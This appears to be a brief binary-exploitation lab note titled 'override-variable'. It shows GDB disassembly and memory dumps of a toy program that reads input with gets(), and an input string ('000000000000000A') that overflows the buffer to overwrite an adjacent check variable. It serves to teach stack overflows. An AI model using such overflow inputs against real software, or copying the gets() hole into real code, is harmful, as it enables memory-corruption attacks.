# override-variable

```
Dump of assembler code for function main:
   0x0000000000400566 <+0>:	    push   rbp
   0x0000000000400567 <+1>:	    mov    rbp,rsp
   0x000000000040056a <+4>:	    sub    rsp,0x10
   0x000000000040056e <+8>:	    mov    BYTE PTR [rbp-0x1],0x42
   0x0000000000400572 <+12>:	mov    edi,0x400664
=> 0x0000000000400577 <+17>:	mov    eax,0x0
   0x000000000040057c <+22>:	call   0x400430 <printf@plt>
   0x0000000000400581 <+27>:	lea    rax,[rbp-0x10]
   0x0000000000400585 <+31>:	mov    rdi,rax
   0x0000000000400588 <+34>:	mov    eax,0x0
   0x000000000040058d <+39>:	call   0x400450 <gets@plt>
   0x0000000000400592 <+44>:	lea    rax,[rbp-0x10]
   0x0000000000400596 <+48>:	mov    rsi,rax
   0x0000000000400599 <+51>:	mov    edi,0x400676
   0x000000000040059e <+56>:	mov    eax,0x0
   0x00000000004005a3 <+61>:	call   0x400430 <printf@plt>
   0x00000000004005a8 <+66>:	cmp    BYTE PTR [rbp-0x1],0x41
   0x00000000004005ac <+70>:	jne    0x4005bf <main+89>
   0x00000000004005ae <+72>:	mov    edi,0x400686
   0x00000000004005b3 <+77>:	mov    eax,0x0
   0x00000000004005b8 <+82>:	call   0x400430 <printf@plt>
   0x00000000004005bd <+87>:	jmp    0x4005ce <main+104>
   0x00000000004005bf <+89>:	mov    edi,0x40068f
   0x00000000004005c4 <+94>:	mov    eax,0x0
   0x00000000004005c9 <+99>:	call   0x400430 <printf@plt>
   0x00000000004005ce <+104>:	mov    eax,0x0
   0x00000000004005d3 <+109>:	leave  
   0x00000000004005d4 <+110>:	ret    
End of assembler dump.
0x7fffffffdc80:	0xffffdd70	0x00007fff	0x00000000	0x42000000
0x7fffffffdc90:	0x004005e0	0x00000000	0xf7a2d830	0x00007fff
0x7fffffffdca0:	0x00000001	0x00000000	0xffffdd78	0x00007fff
0x7fffffffdc80:	"p\335\377\377\377\177"
0x7fffffffdc8f:	"B\340\005@"
```

 Enter 000000000000000A to override the key value

```
Enter a string : 000000000000000A
Dump of assembler code for function main:
   0x0000000000400566 <+0>:	    push   rbp
   0x0000000000400567 <+1>:	    mov    rbp,rsp
   0x000000000040056a <+4>:	    sub    rsp,0x10
   0x000000000040056e <+8>:	    mov    BYTE PTR [rbp-0x1],0x42
   0x0000000000400572 <+12>:	mov    edi,0x400664
   0x0000000000400577 <+17>:	mov    eax,0x0
   0x000000000040057c <+22>:	call   0x400430 <printf@plt>
   0x0000000000400581 <+27>:	lea    rax,[rbp-0x10]
   0x0000000000400585 <+31>:	mov    rdi,rax
   0x0000000000400588 <+34>:	mov    eax,0x0
   0x000000000040058d <+39>:	call   0x400450 <gets@plt>
   0x0000000000400592 <+44>:	lea    rax,[rbp-0x10]
   0x0000000000400596 <+48>:	mov    rsi,rax
   0x0000000000400599 <+51>:	mov    edi,0x400676
   0x000000000040059e <+56>:	mov    eax,0x0
   0x00000000004005a3 <+61>:	call   0x400430 <printf@plt>
=> 0x00000000004005a8 <+66>:	cmp    BYTE PTR [rbp-0x1],0x41
   0x00000000004005ac <+70>:	jne    0x4005bf <main+89>
   0x00000000004005ae <+72>:	mov    edi,0x400686
   0x00000000004005b3 <+77>:	mov    eax,0x0
   0x00000000004005b8 <+82>:	call   0x400430 <printf@plt>
   0x00000000004005bd <+87>:	jmp    0x4005ce <main+104>
   0x00000000004005bf <+89>:	mov    edi,0x40068f
   0x00000000004005c4 <+94>:	mov    eax,0x0
   0x00000000004005c9 <+99>:	call   0x400430 <printf@plt>
   0x00000000004005ce <+104>:	mov    eax,0x0
   0x00000000004005d3 <+109>:	leave  
   0x00000000004005d4 <+110>:	ret    
End of assembler dump.
0x7fffffffdc80:	0x30303030	0x30303030	0x30303030	0x41303030
0x7fffffffdc90:	0x00400500	0x00000000	0xf7a2d830	0x00007fff
0x7fffffffdca0:	0x00000001	0x00000000	0xffffdd78	0x00007fff
0x7fffffffdc80:	'0' <repeats 15 times>, "A"
0x7fffffffdc8f:	"A"
```
